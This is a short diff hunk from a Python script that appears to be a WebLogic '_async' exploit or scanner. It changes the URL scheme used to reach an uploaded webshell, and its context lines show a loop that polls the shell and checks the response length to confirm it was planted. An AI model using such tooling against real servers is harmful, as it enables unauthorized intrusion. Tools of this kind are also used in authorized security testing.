@@ -91,7 +91,7 @@ def get_webshell_test(url):
                 if 'https' in url:
                     shell_url = 'https://' + url.split('/')[2] + '/_async/' + webshell_name
                 else:
-                    shell_url = 'https://' + url.split('/')[2] + '/_async/' + webshell_name
+                    shell_url = 'http://' + url.split('/')[2] + '/_async/' + webshell_name
                 for i in range(10):
                     r2 = requests.get(shell_url, headers=headers2,timeout = 10,verify=False)
                     if r2.status_code == 200 and r2.headers['Content-Length'] == '17':
